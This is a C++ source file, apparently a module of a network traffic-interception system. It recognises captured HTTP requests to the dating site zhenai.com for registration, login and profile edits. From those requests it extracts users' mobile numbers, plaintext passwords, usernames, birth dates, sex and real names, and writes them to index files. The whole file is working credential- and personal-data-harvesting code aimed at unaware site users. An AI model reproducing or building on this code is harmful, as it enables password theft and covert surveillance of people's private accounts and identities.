#include "StdAfx.h"
#include "MarriageZhenAi.h"

marriage::ZhenAiMarriage::ZhenAiMarriage(HttpSession *http_session, const string &pro_name) : Marriage(http_session,pro_name)
{
	app_ = "珍爱网";	
}

marriage::ZhenAiMarriage::~ZhenAiMarriage()
{
	
}

int marriage::ZhenAiMarriage::IsZhenAiMarriage(HttpSession *http_session)
{
	//网页注册
	if((http_session->m_Requestline.m_Host.Find("register.zhenai.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/register/reg55OnView.jsps")!=-1)) 
	{
		return kPcWebRegister;
	}
	//网页登录
	if((http_session->m_Requestline.m_Host.Find("profile.zhenai.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/login/loginactionindex")!=-1)) 
	{
		return kPcWebLogin;
	}
	//网页修改资料
	if((http_session->m_Requestline.m_Host.Find("profile.zhenai.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/v2/userdata/saveDetailInfo")!=-1)) 
	{
		return kPcWebModiy;
	}
	return 0;
}

int marriage::ZhenAiMarriage::Process(const char *packet,int action)
{
	//网页注册
	if (action == kPcWebRegister)
	{
		return PcWebRegister(packet);
	}
	//网页登录
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//网页修改个人资料
	if (action == kPcWebModiy)
	{
		return PcWebModiy(packet);
	}
	return 1;
}
//pc注册
int marriage::ZhenAiMarriage::PcWebRegister(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//性别
	string sex = ms_->GetValueFromMapByKey("baseInfo.sex",true);
	if (sex == "0"){sex = "男";}
	else{sex = "女";}
	//出生日期
	string data = ms_->GetValueFromMapByKey("dateForm.year",true)+ "-" +
		ms_->GetValueFromMapByKey("dateForm.month",true) + "-" +
		ms_->GetValueFromMapByKey("dateForm.day",true);
	//手机号
	string mobile = ms_->GetValueFromMapByKey("baseInfo2.servicemobile",true);
	//密码
	string pwd = ms_->GetValueFromMapByKey("loginInfo.pwd",true);
	if (sex.empty() || data.empty() || mobile.empty() || pwd.empty())
	{
		return 0;
	}
	output_text_ =
		"oid=" + mobile + "\r\n" +           //手机号
		"pass=" + pwd + "\r\n" +             //密码
		"onick=" + data + "\r\n" +           //出生日期
		"sex=" +sex + "\r\n" +               //性别
		"netmark=" + app_ + "\r\n" + 	     //来源
		"clientmsg=" + platformWeb + "\r\n" +//操作平台
		"state=注册\r\n";			         //状态
	WriteIndexFile();
	return 1;
}

//web登录
int marriage::ZhenAiMarriage::PcWebLogin(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	string username = ms_->GetValueFromMapByKey("loginInfo",true);
	string pwd = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() || pwd.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" +          //用户名
		"pass=" + pwd + "\r\n" +               //密码
		"netmark=" + app_ + "\r\n" + 		   //来源
		"clientmsg=" + platformWeb + "\r\n" +  //操作平台
		"state=登录\r\n";			           //状态
	WriteIndexFile();
	return 1;
}

//详细资料个人信息
int marriage::ZhenAiMarriage::PcWebModiy(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	string name = ms_->GetValueFromMapByKey("trueName",true);
	if (name.empty())
	{
		return 0;
	}
	output_text_ =
		"mid=" + name + "\r\n" +                //姓名
		"netmark=" + app_ + "\r\n" + 		    //来源
		"clientmsg=" + platformWeb + "\r\n" +   //操作平台
		"state=修改个人信息\r\n";			    //状态
	WriteIndexFile();
	return 1;
}

